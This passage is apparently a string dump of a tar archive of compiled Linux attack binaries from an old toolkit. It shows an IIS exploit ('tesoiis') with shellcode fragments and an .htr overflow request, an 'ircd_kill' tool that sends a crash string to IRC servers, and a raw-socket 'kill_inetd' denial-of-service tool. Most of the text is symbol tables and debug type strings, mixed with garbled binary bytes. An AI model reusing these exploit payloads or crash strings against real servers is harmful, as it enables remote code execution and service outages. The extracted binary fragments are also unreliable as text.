            "__FRAME_END__",
            "rwhokill.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "bind@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "herror@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/tesoiis",
            "0100755",
            "0000000",
            "0000000",
            "00000040456",
            "07100656722",
            "013553",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "printf",
            "stdout",
            "connect",
            "memcpy",
            "vsnprintf",
            "socket",
            "select",
            "fflush",
            "send",
            "inet_addr",
            "__deregister_frame_info",
            "memset",
            "gethostbyname",
            "getsockopt",
            "htons",
            "__errno_location",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "fcntl",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh",
            "QVhH",
            "8/u5",
            "fEfUE",
            "1fEP",
            "PEP/",
            "P`PE@P& E}",
            "u(EP",
            "u0M\u0283",
            "EPEPj",
            "EPU }",
            ";\t2EPj",
            "[_]U",
            "E}u6E",
            "\u0403;u[]",
            "usage: ./tesoiis host port url",
            "teso crew IIS exploit.. shellcode by eEye.",
            "------------------------------------------",
            "Host: %s Port: %d Url: %s",
            "Connecting... ",
            "failed!",
            "done.. sending shellcode..",
            "done.. closing fd!",
            "BhfuAP",
ghghXX3P[SYf!",
            "K<uCC",
            "ghRQS",
            "ZC2PXPXuCRQSVT",
            "YZC2PXPXuCRS",
            "Z3PX",
            "C2PXPXuCRQSVT",
            "YZ3P@P@PWG3PP",
            "fXPfX!f",
            "C2:u2",
            "RwWZf",
            "VCuAN",
            "63PPjHSwWX[f",
            "PRPRWXPSW\u050b3ZRPRVwWt",
            "PVUW\u0600t",
            "uUW3@PSW\u4410lfsofmTS!!!!!xf!hb!xtpdlTS!!!!!!O!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!.htr HTTP/1.0",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "tesoiis.c",
            "_DYNAMIC",
            "net_write",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "net_resolve",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "fflush@@GLIBC_2.0",
            "select@@GLIBC_2.0",
            "vsnprintf@@GLIBC_2.0",
            "__errno_location@@GLIBC_2.0",
            "_init",
            "front",
            "__deregister_frame_info@@GLIBC_2.0",
            "getsockopt@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "_start",
            "net_connect",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "fcntl@@GLIBC_2.0",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "stuff",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0",
            "datapool/bin/ircd_kill",
            "0100755",
            "0000000",
            "0000000",
            "00000032543",
            "07100656614",
            "014026",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "printf",
            "connect",
            "perror",
            "malloc",
            "sleep",
            "socket",
            "bzero",
            "send",
            "strcat",
            "inet_addr",
            "__deregister_frame_info",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh\u0109",
            "QVh@",
            "1fEPG",
            "UPEP",
            "PEPEP",
            "\u0403;u[]",
            "socket",
            "Usage: %s <ip_of_irc_server> <port>",
            "SERVER warez.blackdown.org aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa :[",
            "Creating string to send... Wait a sec...",
            "connect",
            "Wait... Server might be talking to us...",
            "Sending crash string...",
            "send",
            "Done!",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "ircd_kill.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "sleep@@GLIBC_2.0",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "strcat@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0",
            "datapool/bin/kill_inetd",
            "0100755",
            "0000000",
            "0000000",
            "00000033557",
            "07100656617",
            "014221",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "perror",
            "socket",
            "fprintf",
            "__deregister_frame_info",
            "htonl",
            "sendto",
            "memset",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRhd",
            "QVh$",
            "E1fE",
            "fE1fu",
            "e[^]",
            "1fR9",
            "P }\"h",
            "M@eM",
            "fEfE",
            "fE\u04031fEP[",
            "fE\u0483E",
            "9H7(P",
            "MPeM",
            "eeee\u07c0e?h",
            "fEfE",
            "EPEPEPY",
            "1fEPEPEP",
            "\u0403;u[]",
            "sendto",
            "Unknown host %s",
            "Usage: %s target [port [source]]",
            "socket (raw)",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
